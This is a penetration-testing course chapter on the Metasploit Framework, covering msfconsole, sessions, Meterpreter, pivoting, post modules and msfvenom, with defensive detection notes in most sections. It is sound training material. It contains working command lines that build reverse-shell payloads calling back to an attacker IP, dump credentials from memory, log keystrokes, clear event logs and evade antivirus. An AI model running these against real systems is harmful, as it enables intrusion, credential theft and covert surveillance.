---
title: "7. Metasploit Framework"
order: 7
part: "Exploitation"
description: "Module types, the msfconsole workflow, session management, Meterpreter, pivoting, post modules and resource scripts."
---

Metasploit splits an attack into three abstractions: **exploit** (the code that triggers the vulnerability) + **payload** (the code that runs on the target once exploitation succeeds) + **encoder/nop/evasion** (fitting the payload to the target environment/AV). Why does this distinction matter? Because you can use the same exploit with different payloads, and the same payload with different exploits; the framework's power comes from this modularity.

## 7.1 Architecture and module types

Metasploit is a modular framework written in Ruby. The main interface is `msfconsole`; there are also `msfvenom` (standalone payload generator, see 7.9), `msfdb` (database manager), and `msfrpcd` (RPC service) components. Modules are kept on disk under `/usr/share/metasploit-framework/modules/` in a type/platform/service hierarchy; a module's full path (`exploit/windows/smb/ms17_010_eternalblue`) mirrors this directory structure exactly.

**All module types:**

| Type | Directory | What it does | Example |
| --- | --- | --- | --- |
| **exploit** | `exploit/` | Triggers a specific vulnerability; if successful, runs the payload | `exploit/windows/smb/ms17_010_eternalblue` |
| **payload** | `payload/` | Code that runs on the target after exploitation (shell, Meterpreter, exec) | `windows/x64/meterpreter/reverse_tcp` |
| **auxiliary** | `auxiliary/` | Non-exploit jobs: scanning, fuzzing, brute-force, DoS, spoofing, server (SMB/HTTP capture) | `auxiliary/scanner/smb/smb_ms17_010` |
| **post** | `post/` | Modules that run after a session is opened (enum, hashdump, privesc suggestion, pivoting) | `post/multi/recon/local_exploit_suggester` |
| **encoder** | `encoder/` | Re-encodes the payload's bytes; avoids bad characters, changes the signature | `x86/shikata_ga_nai` |
| **nop** | `nop/` | Generates a NOP sled (to fill the buffer and align the payload) | `x86/opty2` |
| **evasion** | `evasion/` | Generates payloads/files designed to evade AV/EDR (came with MSF 5+) | `evasion/windows/windows_defender_exe` |

**Why do you need to know the module type?** For example, when asked "detect whether this target is vulnerable to MS17-010 *without exploiting* it," the answer is an **auxiliary scanner** (`auxiliary/scanner/smb/smb_ms17_010`); the tool for "how do I escalate to SYSTEM" is a **post** module; "how do I get the payload past AV" is a matter of **evasion/encoder**. The verb at the root of the question (detect / exploit / gather / evade) leads you to the right type.

### Payload anatomy: singles, stagers, stages

Payloads can be a single piece (inline/single) or two pieces (staged). This distinction is a classic trap:

- **Single (inline):** A self-contained, single-piece payload that includes all its functionality. There is no second download over the network. Ideal for small jobs (run a command, add a user); its size is large but it does not depend on the transport. Example: `windows/shell_reverse_tcp`.
- **Stager:** A small, minimal first stage. Its only job is to connect back to the attacker (or listen) and download the actual large code (the stage) into memory and run it. Example: the `reverse_tcp` stager.
- **Stage:** The actual large payload that the stager downloads (e.g., the full Meterpreter DLL). It is not written to disk; it is run in memory by the stager.

**Naming rule (asked VERY often):** Look at the separator character.

- `windows/shell/reverse_tcp` → **staged** (separated by a slash `/`: shell *stage* + reverse_tcp *stager*).
- `windows/shell_reverse_tcp` → **single/inline** (joined by an underscore `_`: a single piece).

| Payload | Type | Note |
| --- | --- | --- |
| `windows/x64/meterpreter/reverse_tcp` | staged | Most common; the small stager pulls the large Meterpreter into memory |
| `windows/x64/meterpreter_reverse_tcp` | single | Single-piece Meterpreter; for narrow cases where a staged connection is not possible |
| `windows/shell_reverse_tcp` | single | Single-piece cmd.exe shell |
| `windows/shell/reverse_tcp` | staged | Stager + shell stage |

**Why does it matter?** In narrow/limited transports (a small buffer overflow, limited write) the stager fits but the full payload doesn't → you use staged. In an environment where a second connection on the network is blocked (the stage download fails) → you use single. Also, some detection systems catch the stage download (the Meterpreter DLL in the second TCP stream); single looks different because it's a single stream.

**reverse vs bind:** `reverse_tcp` has the target connect to the attacker (preferred when outbound filters on the target are loose and you're behind NAT). `bind_tcp` has the target open a port and wait, with the attacker connecting to it (when the target's outbound access is closed but you can reach it). NAT/firewalls often force the use of `reverse`. `reverse_https`/`reverse_http` make the traffic look like TLS/HTTP → this makes detection harder on proxied/monitored networks and provides "reconnection" (session retry) after a dropped connection.

**Note:** If there's a `/` it's staged, if there's a `_` it's single. `meterpreter` is staged while `meterpreter_reverse_tcp` is single. In a staged payload, LHOST/LPORT are used both for the stager's initial connection and for the stage transfer; if you don't set PAYLOAD on `exploit/multi/handler` to exactly the same value, the stage transfer fails (the most common manual-handler mistake).

**Detection/Defense:** Staged Meterpreter pulls the DLL into memory in a second TCP stream after the stager; network IDS's (Suricata/Snort) catch this stage by signature, while EDR catches `reflective DLL injection` + an unknown process's raw socket traffic by behavior. Outbound traffic on 4444 (the default LPORT) is a classic IOC; the blue team monitors 4444 and outbound connections from unknown processes.

## 7.2 msfconsole: the full workflow

Starting `msfconsole` and general commands:

```
msfconsole -q            # -q: don't show startup banner (quiet)
msfconsole -r script.rc  # run a resource (.rc) script on startup
msfconsole -x "db_status; version"   # run given commands and drop to console
```

Basic navigation inside the console:

```
help                 # command list
help search          # all keywords for the 'search' command
version              # framework version
banner               # random banner + module counts
connect 10.10.10.5 445   # netcat-like connection (-z: only test connection, don't send data)
```

### search and its operators

Without `search` you get lost among 2000+ exploits. Operators are in the form `key:value`, and more than one combine with AND logic; free-form words can also be added.

| Operator | What it filters | Example |
| --- | --- | --- |
| `type:` | Module type (exploit/auxiliary/post/payload/encoder/nop/evasion) | `type:exploit` |
| `platform:` | Target platform | `platform:windows` |
| `cve:` | CVE identifier | `cve:2017-0144` |
| `name:` | A word occurring in the module's descriptive name | `name:eternalblue` |
| `path:` | A word occurring in the module path | `path:smb` |
| `rank:` | Reliability rank (excellent...manual) and above | `rank:excellent` |
| `author:` | Module author | `author:hdm` |
| `port:` | Relevant port | `port:445` |
| `target:` | Target name/OS | `target:2008` |
| `arch:` | Architecture (x86/x64) | `arch:x64` |
| `cve:`, `edb:`, `bid:`, `ref:` | CVE / Exploit-DB / Bugtraq / generic reference identifier | `edb:42315` |

```
search type:exploit platform:windows name:smb ms17
search cve:2021-34527           # PrintNightmare
search type:auxiliary scanner smb
search rank:excellent type:exploit platform:windows rdp
```

After a search, an **index number** appears before each module; you can select the first result with `use 0`. For the full list, always run `help search` (the keyword set expands by version; modern Metasploit 6.x also offers additional keys such as `aka`, `description`, `date`, `check`, `session_type`).

**Note:** `search rank:excellent` does not mean "excellent **and above**"; it behaves according to the Metasploit version. To be sure, use the `MinimumRank` global setting (below). `cve:` is in the format of two digits plus four/five digits (`cve:2017-0144`); don't give the full CVE string. `arch:` was not a search key in some older versions, but it always appears in the `info` output.

### Selecting, inspecting, and configuring a module

```
use exploit/windows/smb/ms17_010_eternalblue   # or 'use 7' after search
info                     # description, options, references, CVE, rank, targets
info -d                  # open module docs in browser as markdown
show options             # configurable options (those with Required=yes are mandatory)
show advanced            # advanced/fine-tuning options (timeout, retry, EXITFUNC...)
show payloads            # payloads COMPATIBLE with this exploit
show targets             # target types/OS versions (target index)
show evasion             # (in the evasion module) evasion options
show missing             # required options not yet filled in
```

Setting options:

```
set RHOSTS 10.10.10.10            # target(s); also accepts CIDR/range/file (file:/path)
set RPORT 445
set LHOST tun0                    # give interface name → MSF automatically gets the correct IP
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set TARGET 0                      # select target OS from the 'show targets' index
setg RHOSTS 10.10.10.10           # GLOBAL set: applies to all modules (e.g. setg LHOST tun0)
unset RPORT                       # clear a single option
unsetg LHOST                      # clear a global option
get RHOSTS                        # show an option's current value
setg MinimumRank great            # prevent accidentally running exploits below 'great'
```

**`set` vs `setg`:** `set` is only valid for the currently selected module; it is lost when you switch to another module with `use`. `setg` carries the value to every module for the duration of the `msfconsole` session: for values repeated in every module such as LHOST/LPORT/RHOSTS, `setg` them once instead of rewriting them constantly. The `save` command permanently saves the global settings to `~/.msf4/config`.

**The `LHOST tun0` trick:** When you give an interface name instead of an IP (`tun0` in HTB/VPN environments), MSF automatically picks that interface's current IP. Writing a wrong/stale IP is the most common cause of the "why isn't the session coming in" error.

### check, exploit, and -j / -z

```
check                 # (in supporting modules) is the target vulnerable? tests WITHOUT exploiting
exploit               # exploit (synonym 'run'); foreground, drops into session once opened
run                   # 'run' is customary instead of 'exploit' in auxiliary/post modules
exploit -j            # run payload handler as JOB (background) → console stays free
exploit -z            # AUTOMATICALLY background it once session opens (don't go interactive)
exploit -j -z         # persistent handler in background waiting for multiple sessions (most common handler pattern)
exploit -e <encoder>  # encode the payload with the specified encoder
exploit -f            # force run even if not shown as vulnerable (even if check says 'safe')
jobs -l               # list running jobs (including background handlers)
jobs -k <id>          # terminate a job
kill <id>             # kill the job (equivalent to jobs -k)
```

`exploit -j` keeps the handler in the background; it is required when more than one victim will connect to the same payload (phishing/multiple targets). `exploit -z` backgrounds the session as soon as it opens, so the console doesn't lock up. When you use both together with `set ExitOnSession false`, the handler does not close after the first session; it opens a new session for every victim that connects:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0 ; set LPORT 443
set ExitOnSession false
exploit -j -z
```

**Note:** `check` exists only in *some* modules; it returns "The target appears to be vulnerable" / "is not vulnerable" / "Cannot reliably check". Some exploits, such as EternalBlue, don't have `check` → you detect it with `auxiliary/scanner/smb/smb_ms17_010`. With `exploit -j` the handler goes to the background but still prints output to the console; you see the session with `sessions -l`.

**Detection/Defense:** When an exploit runs, a new child process (e.g., `rundll32`, `cmd`, `powershell`) plus an outbound connection is usually created on the target. Sysmon **Event ID 1** (ProcessCreate) + **Event ID 3** (NetworkConnect) are monitored; for service-based exploits, **Event ID 7045** (new service) / Security **4697**. IDS signatures catch EternalBlue's SMB trans2/trans packets.

## 7.3 Session management

When an exploit/handler succeeds, a **session** opens (Meterpreter or a raw shell). Sessions live independently of the console; you can manage more than one in parallel.

```
sessions -l                 # list all active sessions (ID, type, connection info)
sessions -i 2               # switch to session 2 (interact)
background                  # (while in Meterpreter) background the session; Ctrl+Z also works
sessions -u 1               # UPGRADE SHELL session 1 to Meterpreter
sessions -k 3               # kill session 3; -k all → all of them
sessions -K                 # kill ALL sessions
sessions -c "whoami"        # run a command in selected (or all) SHELL sessions with -i
sessions -C "getuid"        # run a Meterpreter command in all METERPRETER sessions
sessions -n web01 -i 2      # name session 2 'web01' (-n)
sessions -s <script>        # run a post module/script in the session
```

| Flag | Function |
| --- | --- |
| `-l` | List active sessions |
| `-i <id>` | Enter the specified session interactively |
| `-k <id>` / `-K` | Terminate session(s) |
| `-u <id>` | Upgrade a shell session to Meterpreter (`post/multi/manage/shell_to_meterpreter`) |
| `-c <cmd>` | Run a command in shell session(s) |
| `-C <cmd>` | Run a Meterpreter command in Meterpreter session(s) |
| `-n <ad>` | Give the session a name |
| `-s <script>` | Run a script/post module in the session |

**Upgrading shell to Meterpreter:** A raw shell (e.g., a cmd coming from a web exploit) is limited; `sessions -u 1` runs the `shell_to_meterpreter` post module in the background and triggers a new Meterpreter stager on the target (opening a new LPORT listener). After the upgrade, a new Meterpreter session appears in the `sessions -l` listing.

**Note:** `-c` is for raw **shell** sessions, `-C` is for **Meterpreter** sessions; don't mix them up. `background` only backgrounds the session (the session keeps living); `exit` closes the Meterpreter session. `Ctrl+Z` backgrounds the session but on some terminals can background msfconsole itself → to be sure, type `background`.

## 7.4 Database and data management

Metasploit keeps discovery/scan results in a PostgreSQL database; this is vital when working with large numbers of hosts/services/credentials (and for reporting).

```
# Setup and status (OUTSIDE the console, in the shell)
msfdb init                 # start/create the PostgreSQL DB and connect it to msfconsole
msfdb status               # is the DB running
msfdb reinit               # reset
systemctl start postgresql # if the DB service is down

# INSIDE the console
db_status                  # connection status
workspace                  # list existing workspaces (* = active)
workspace -a gpen_proje    # add a new workspace and switch to it
workspace gpen_proje       # switch to workspace
workspace -d eski_proje    # workspace sil
```

**Workspace** = an isolated project container. Open a separate workspace for each client/engagement; the `hosts`, `services`, `creds` commands show only the active workspace's data. This prevents one test's data from mixing with another's.

Getting scan data into the DB:

```
db_nmap -sV -p- 10.10.10.0/24    # run nmap from within MSF → result goes to the DB automatically
db_import /path/allports.xml     # import an nmap XML taken externally (or Nessus/Nexpose)
db_export -f xml /tmp/out.xml    # export the DB
```

`db_nmap` takes the exact same `nmap` syntax (see Section 5); its only difference is that it writes the output to the DB. You import output from an external `nmap -oX allports.xml ...` with `db_import`.

Data query commands:

| Command | Content | Useful flags |
| --- | --- | --- |
| `hosts` | Discovered hosts (IP, OS, status) | `-c address,os_name`, `-S <ara>`, `-R` (assign to RHOSTS) |
| `services` | Open services/ports | `-p 445`, `-s smb`, `-u` (only up), `-R` |
| `vulns` | Matched vulnerabilities | `-S ms17` |
| `creds` | Collected credentials (hash/password) | `creds -t ntlm`, `creds add ...` |
| `loot` | Downloaded file/hash dumps | hashdump output lands here |
| `notes` | Free-form notes/additional info | `-t <type>` |

```
hosts -R                   # assign the listed hosts directly to the RHOSTS variable
services -p 445 -R         # assign hosts with 445 open to RHOSTS (then run the module directly)
creds                      # show all collected credentials
loot                       # show loot like hashdump/screenshot
```

**The `-R` trick:** The `services -p 445 -R` command automatically writes all hosts with port 445 open to the selected module's `RHOSTS` variable; this saves you from typing IPs one by one and saves time.

**Note:** If `db_nmap` doesn't work, first check the DB connection with `db_status`, then check the service with `msfdb status`/`systemctl status postgresql`; on Kali, PostgreSQL may come up stopped initially. `hashdump` and `loot` output is also written to the `loot` and `creds` tables in the DB; it is gathered from there for reports.

## 7.5 Meterpreter: the full command reference

Meterpreter is an advanced payload based on DLL injection/reflective loading that runs in the target's memory, **does not write to disk**, and talks over an encrypted (TLS) channel. Because it leaves no trace on disk and carries its own command set, it is the backbone of post-exploitation. The command set varies slightly by platform (windows/linux/python/java/php); the following is mostly Windows Meterpreter.

### Core / session commands

```
help                 # Meterpreter command list (expands based on loaded extensions)
background            # background the session (return to console)
sessions             # (from within Meterpreter) list without switching to other sessions
guid                 # oturumun GUID'i
machine_id           # target machine identity
sysinfo              # OS, arch, hostname, domain, number of logged-on users
getuid               # which user I'm running as (Server username)
getpid               # PID of the process Meterpreter is embedded in
getsid               # current user's SID
exit / quit          # close the session
```

### File system and command execution

```
pwd ; ls ; cd C:\\Users ; cat flag.txt
search -f *.kdbx -d C:\\     # search for a file (-f pattern, -d starting directory)
download C:\\path\\secret.docx /tmp/     # download from target (-r: recursive directory)
upload /tmp/nc.exe C:\\Windows\\Temp\\   # upload to target
edit notes.txt       # edit the file on the target with vi
rm ; mkdir ; mv ; cp
execute -f cmd.exe -i -H    # start a process (-f file, -i interactive, -H hidden window)
execute -f notepad.exe -m -d calc.exe  # -m from memory, -d dummy process name (masquerade)
shell                # drop into a local cmd.exe/bash session on the target (Ctrl+Z to go back)
```

### Reconnaissance and process management

```
ps                   # running processes (PID, name, user, arch, session)
ps -S lsass          # filter by name
pgrep explorer       # find the PID by name
migrate <PID>        # migrate to another process (stability + stealth)
migrate -N explorer.exe  # switch to target process by name
kill <PID>           # kill process
getenv PATH          # environment variable
idletime             # how long since the user touched the keyboard (to check if the session is active)
```

**Why is `migrate` critical?** Meterpreter initially sits inside the process you exploited (e.g., a short-lived exploit process or an application the user will close). If that process dies, the session dies too. With `migrate` you move to a long-lived, less suspicious process (e.g., `explorer.exe` in a user context, `winlogon.exe`/`lsass.exe` in a SYSTEM context; the latter raises a high alarm in EDR). Also, migrating from x86 Meterpreter to an x64 process is required for access to some APIs (hashdump, kiwi); **architecture matching** is mandatory.

### Privilege escalation and identity/token

```
getprivs             # current token's privileges (SeDebugPrivilege, SeImpersonate...)
getsystem            # escalate to SYSTEM (automatically tries various techniques)
getsystem -t 1       # force a specific technique
hashdump             # local NTLM hashes from SAM (requires SYSTEM)

# token stealing with Incognito (if SeImpersonate/SeAssignPrimaryToken present)
load incognito
list_tokens -u       # available delegation/impersonation tokens by user
impersonate_token "DOMAIN\\Administrator"
rev2self             # drop the stolen token, revert to the original identity

# credentials from memory with Kiwi (Mimikatz 2.x port)
load kiwi
creds_all            # all credentials in memory (password/hash/ticket)
creds_msv            # NTLM/SHA1 (MSV)
creds_wdigest        # WDigest plaintext passwords (cleartext on older systems)
creds_kerberos       # Kerberos biletleri/kimlikleri
lsa_dump_sam         # SAM dump (local accounts)
lsa_dump_secrets     # LSA secrets (service account passwords, cached)
kiwi_cmd "sekurlsa::logonpasswords"   # run a raw mimikatz command
dcsync_ntlm DOMAIN\\krbtgt            # (if DC privileges present) pull hashes with DCSync
```

**`getsystem` techniques (why they work):** `getsystem` tries several known SYSTEM-escalation techniques in the background:

- **Technique 1: Named Pipe Impersonation (In Memory/Admin):** Meterpreter creates a named pipe and tricks a SYSTEM service into connecting to it; it uses `SeImpersonatePrivilege` to impersonate the SYSTEM token of whatever connects to the pipe.
- **Technique 2: Named Pipe Impersonation (Dropper/Admin):** Drops a service dropper to disk.
- **Technique 3: Token Duplication (In Memory/Admin):** Duplicates the token of an existing SYSTEM process using `SeDebugPrivilege`.
- It usually succeeds if you're in a High Integrity administrator context; it does not work as a standard user → a local privesc exploit is needed first (see `local_exploit_suggester`, 7.7).

**Note:** `hashdump` requires **SYSTEM** privilege; as a standard user it returns "Insufficient privileges" → run `getsystem` first. If `getuid` returns "NT AUTHORITY\SYSTEM," the escalation succeeded. `load kiwi` requires x64 Meterpreter on an x64 target (or migrating to an x64 process); kiwi errors out on an architecture mismatch. For `incognito` the token needs to be of **delegation** type (an impersonation token may not be enough for identity over the network).

### Persistence, network, observation, and clearing traces

```
# Network / routing (for pivoting, see 7.6)
ipconfig / ifconfig  # target's interfaces (for internal network discovery!)
route                # target's routing table (is there a gateway to another subnet)
arp                  # ARP table (live hosts on the internal network)
netstat -ano         # connections/listening ports
portfwd add -l 3389 -p 3389 -r 10.10.20.5   # local port forwarding (see 7.6)

# Observation
screenshot           # take a screenshot (saves to loot)
screenshare          # live screen (VNC-like)
webcam_list ; webcam_snap
record_mic -d 10     # microphone recording
keyscan_start ; keyscan_dump ; keyscan_stop   # keylogger
enumdesktops ; setdesktop

# Persistence / execution
run persistence -h   # (old) persistence script, deprecated; prefer the post module
run post/windows/manage/persistence_exe
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v X -d "..."   # registry
at / schtasks (via shell)   # scheduled task

# Cleaning up traces
clearev              # CLEARS Windows Event logs (App/System/Security)
timestomp file.exe -m "01/01/2020 10:00:00"   # change file timestamps (MACE)
```

**`run post/...` and `run <script>`:** From within Meterpreter you can run a post module directly with `run <post_module_path>` (`run post/windows/gather/hashdump`). The old `run <script>.rb` meterpreter scripts (e.g., `run persistence`) are deprecated; current practice is **post modules**.

**Note:** `clearev` deletes all three main Windows logs, and **this deletion itself is logged** (Security **Event ID 1102: "audit log cleared"**; **Event ID 104** when the System log is cleared). So clearev does not provide stealth; on the contrary, it leaves a clear IOC. `timestomp` is meant to mislead forensic analysis, but some timestamps are still retained in the NTFS `$MFT`; forensic tools catch the inconsistency.

**Detection/Defense (Meterpreter in general):**

- **Process injection / migrate:** Sysmon **Event ID 8** (CreateRemoteThread), **Event ID 10** (ProcessAccess: one process accessing another process's memory). EDR catches reflective DLL injection behaviorally.
- **LSASS access (kiwi/mimikatz/hashdump):** `GrantedAccess 0x1010/0x1410` access to `lsass.exe` via Sysmon **Event ID 10** is a classic mimikatz IOC; Windows Defender Credential Guard protects WDigest/LSA secrets, and **WDigest** is disabled via the registry (`UseLogonCredential=0`).
- **SAM/hashdump:** Access to the SAM registry hive is **Event ID 4663/4656**.
- **Token impersonation (incognito):** Logon events are **Event ID 4624** (Logon Type 9: NewCredentials); privileged token use is **4672/4673/4674**.
- **Defense:** LAPS (local admin password rotation, reduces PtH value), Credential Guard, restricting service accounts granted SeImpersonate, Sysmon + SIEM correlation.

## 7.6 Pivoting: reaching the internal network (in depth)

Pivoting: moving, through the first host you compromised (which may be dual-homed), into an internal subnet you cannot reach directly. First discover the target's internal connectivity:

```
# map the internal network from within Meterpreter
ipconfig               # is there a second NIC / internal IP (e.g. 10.10.20.x)
route                  # which subnets are reachable
arp                    # live neighbors on the internal network
```

There are three main pivoting mechanisms; knowing which to choose when matters:

| Technique | What it provides | When | Scope |
| --- | --- | --- | --- |
| **autoroute** | Routes MSF modules' traffic to the internal subnet over the pivot session | When you'll hit the internal network *with Metasploit modules* | Only traffic internal to MSF |
| **socks_proxy + proxychains** | Carries external tools (nmap, crackmapexec, ssh) into the internal network | When you'll use a tool *outside* MSF | All TCP tools |
| **portfwd** | Binds a single internal port to your local machine | When you'll access a single service (RDP/DB/web) | Single port |

### autoroute: MSF internal routing

`autoroute` adds a rule to Metasploit's internal routing table saying "traffic headed to this subnet should go over this session." This way, all MSF modules except `db_nmap` (auxiliary scanner, exploit) can see the internal subnet. There are two ways to do it:

```
# as a Meterpreter command (while inside the session)
run autoroute -s 10.10.20.0/24      # add a route for this subnet
run autoroute -s 10.10.20.0 -n 255.255.255.0
run autoroute -p                    # show current routes
run autoroute -d -s 10.10.20.0/24   # delete the route

# As a post module (after backgrounding the session)
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run

# Console level route command (alternative)
route add 10.10.20.0/24 1           # subnet → session 1
route print
```

After the route is added, scan the internal network from within MSF:

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.20.5
set PORTS 445,3389,80
run                                 # traffic automatically goes through session 1
```

**Why not `db_nmap`?** `db_nmap`/external `nmap` use raw sockets and **do not use** MSF's internal route table; autoroute only routes MSF modules' Ruby socket layer. To scan the internal network with `nmap`, you need socks_proxy + proxychains.

### socks_proxy + proxychains: carrying external tools

After autoroute establishes the internal route, you open a SOCKS server and route outside tools (via proxychains) into the internal network over this route:

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5                 # SOCKS version: 4a or 5 (default 5)
run -j                        # start as a job
jobs -l                       # verify it's running
```

Then add the line that **matches** the version to the bottom of the `/etc/proxychains4.conf` (or `/etc/proxychains.conf`) file:

```
# If you're using SOCKS5:
socks5 127.0.0.1 1080
# If you're using SOCKS4a (if you did set VERSION 4a):
socks4 127.0.0.1 1080
```

Now hit the internal network by putting external tools behind proxychains:

```
proxychains nmap -sT -Pn -p 445,3389 10.10.20.5    # -sT REQUIRED (SOCKS needs TCP connect)
proxychains crackmapexec smb 10.10.20.0/24
proxychains xfreerdp /v:10.10.20.5 /u:admin
proxychains ssh admin@10.10.20.5
```

**Why are `-sT -Pn` mandatory?** proxychains can only carry full **TCP connect** calls over SOCKS; `nmap`'s default SYN scan (`-sS`) sends raw packets, which the proxy cannot carry → `-sT` (connect scan) is required. `-Pn` skips ping discovery (ICMP doesn't pass through the proxy either; without skipping it, the host appears "down"). UDP doesn't go over SOCKS either.

**Note:** The version in the proxychains config (`socks4`/`socks5`) must exactly match the `VERSION` in the module; a mismatch results in "connection refused/denied". In modern Metasploit, the `socks_proxy` module's `VERSION` default is **5** (the old `socks4a` module was merged in). SOCKS4a/5 does hostname resolution on the proxy (pivot) side → you can use internal DNS names. Port conflicts (e.g., another proxychains/tor on 9050) are a common mistake; match `SRVPORT` and the config port.

### portfwd: single-port tunnel

To access a single internal service (e.g., an internal host's RDP), portfwd is the simplest route; it opens a port on your local machine through the pivot host:

```
portfwd add -l 3389 -p 3389 -r 10.10.20.5    # -l local listen port, -p remote port, -r remote host
portfwd list
portfwd delete -l 3389
# Then connect from local:
xfreerdp /v:127.0.0.1:3389 /u:administrator
# Reverse direction (reverse portfwd): catch the connection coming to you from the internal host
portfwd add -R -l 4444 -L 10.10.14.5 -p 8080
```

**Detection/Defense (pivoting):** Pivoting produces unexpected internal network scans/a large number of connections (lateral) from a single host. NetFlow/east-west traffic anomalies, a workstation opening 445/3389 to internal hosts it doesn't normally talk to, and connections from the same source IP to many targets in a short time are detection signals. Defense: network segmentation/microsegmentation, restricting internal host-to-host traffic (SMB/RDP only from the management VLAN), blocking lateral communication between workstations.

## 7.7 Post modules

Post modules run after a session is opened; they are run from Meterpreter with `run post/...`, or by backgrounding the session and using `use post/...; set SESSION <id>; run`. The most critical ones:

```
# Privesc suggestion, which local exploit works with the current session?
run post/multi/recon/local_exploit_suggester
# or:
use post/multi/recon/local_exploit_suggester ; set SESSION 1 ; run

# Kimlik/hash toplama
run post/windows/gather/hashdump                 # SAM (requires SYSTEM)
run post/windows/gather/smart_hashdump           # multiple techniques, tries NTDS on DC
run post/windows/gather/credentials/credential_collector
run post/linux/gather/hashdump                   # /etc/shadow

# Enumerasyon
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain              # domain controller bulma
run post/windows/gather/checkvm                  # sanal makine mi
run post/multi/gather/ssh_creds                  # SSH key/password harvesting
run post/windows/manage/migrate                  # automatically migrate to a safe process
run post/windows/manage/enable_rdp               # enable RDP
```

**Why is `local_exploit_suggester` valuable?** It reads the current session's OS version, architecture, and patch status, and lists local privesc exploit modules as "applicable/not applicable". When you can't escalate to SYSTEM (getsystem fails), it's the first point of reference; you `use` the module it suggests and run it with `set SESSION`.

**Note:** Even if `local_exploit_suggester` says "The target appears to be vulnerable," not every suggestion works; the exploit must match the architecture (x86/x64) and the exact build number. `smart_hashdump` tries to pull domain hashes from NTDS.dit on a DC; on a member server it only grabs the local SAM.

## 7.8 Resource (.rc) scripts: automation

An `.rc` file is an automation script containing msfconsole commands line by line (and, if desired, `<ruby>...</ruby>` blocks). You script repetitive handler setup, a scan chain, or automatic post modules after a session opens.

```
# handler.rc contents:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
set ExitOnSession false
exploit -j -z
```

Running it:

```
msfconsole -q -r handler.rc           # run at startup
resource handler.rc                   # run from within the console
makerc /tmp/session.rc                # save the commands you've typed up to that MOMENT as .rc
```

With `AutoRunScript`, a command is run automatically as soon as a session opens:

```
set AutoRunScript "post/windows/manage/migrate"
set AutoRunScript "multi_console_command -rc /tmp/onsession.rc"
```

**Note:** `makerc` dumps the session history to an `.rc` file, but it may not fully capture interactive steps other than `set`/`use` (e.g., in-session commands). `.rc` commands run in order; if you don't put `exploit -j` after a handler line, the listener won't start.

## 7.9 msfvenom integration

`msfvenom` is a standalone payload/encoder generator outside of msfconsole (a merger of `msfpayload` + `msfencode`). It's used to generate a phishing attachment, a web shell, an exe to be run, or shellcode in a custom format; you catch the payload you generate with `exploit/multi/handler`.

```
# Windows reverse Meterpreter exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf
# PowerShell / web / shellcode formats
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f psh -o sh.ps1
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o sh.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f c   # shellcode (C dizisi)
# Listeleme
msfvenom -l payloads ; msfvenom -l encoders ; msfvenom -l formats
```

| Flag | Function |
| --- | --- |
| `-p` | Select the payload (`-p -` → read raw payload from stdin) |
| `-f` | Output format (exe, elf, raw, psh, python, c, dll, war, apk, vbs, hta-psh, ...) |
| `-o` | Output file |
| `-a` / `--platform` | Architecture / platform |
| `-e` | Encoder (e.g., `x86/shikata_ga_nai`) |
| `-i` | Number of encoder iterations (how many times it will be encoded) |
| `-b` | Bad characters (`-b '\x00\x0a\x0d'`: generate a payload that doesn't contain these) |
| `-n` | NOP sled size (`-n 16`) |
| `-x` / `-k` | Template exe (`-x calc.exe`); `-k` injects the payload while preserving the template's execution |
| `--smallest` | The smallest possible payload |
| `--encrypt` | Encrypt the payload (`--encrypt aes256 --encrypt-key <k>`); for modern evasion |

Eliminating **bad characters** with `-b` is critical in buffer overflow exploits: the target application cuts off the payload at bytes like `\x00` (null), `\x0a` (LF), `\x0d` (CR); `-b '\x00\x0a\x0d'` looks for an encoding that doesn't contain these bytes (see the exploit development topics related to this chapter). `-x calc.exe -k` embeds the payload inside a legitimate exe (for social engineering).

## 7.10 Encoders, the limits of AV evasion, and exploit rank

### Encoders and the AV reality

An encoder's **real purpose is not AV evasion**; it is to avoid bad characters and fit the byte layout to the target. `x86/shikata_ga_nai` is a polymorphic, XOR-based additive-feedback encoder ("excellent" rank) that produces different bytes on every iteration. It used to evade signatures; however, because modern AV/EDR does emulation plus memory scanning, **shikata_ga_nai no longer provides reliable AV evasion**: the decoder stub and the decoded payload get caught in memory.

```
# Multiple iterations (signature variation, INSUFFICIENT for AV):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=.. -e x86/shikata_ga_nai -i 10 -f exe -o s.exe
```

For real AV/EDR evasion: **evasion modules** (`use evasion/windows/...`), `--encrypt`, a custom crypter/packer, injection into a legitimate binary (`-x -k`), or not using an MSF-signed payload at all. What you need to know: "encoding = evading AV" is a **false** equation.

**Note:** An encoder does not shrink a payload; it usually makes it a bit bigger (it adds a decoder stub). It is not guaranteed that an encoder can avoid all the bad characters you gave with `-b`; if it can't, msfvenom errors out and doesn't generate the payload.

### Exploit rank (reliability) table

Every exploit has a **rank**; it shows the likelihood of crashing the target and its suitability for automation. It appears in `info` and `search` output. In production/real testing, a low-rank exploit carries the risk of crashing the service (DoS).

| Rank | Meaning |
| --- | --- |
| **excellent** | Never crashes the service (like SQLi, command injection, RCE); the safest |
| **great** | Has a default target, automatic target detection, or version-checked; very reliable |
| **good** | Has a default target for a common setup |
| **normal** | Reliable but tied to a specific version, with no/weak automatic detection |
| **average** | Generally unreliable/hard to run |
| **low** | Very hard to run on common platforms (<50%) |
| **manual** | Unstable, close to DoS, or requires manual configuration; almost never runs automatically |

```
setg MinimumRank great     # prevent exploits rated 'great' from running accidentally
search rank:excellent type:exploit platform:windows
```

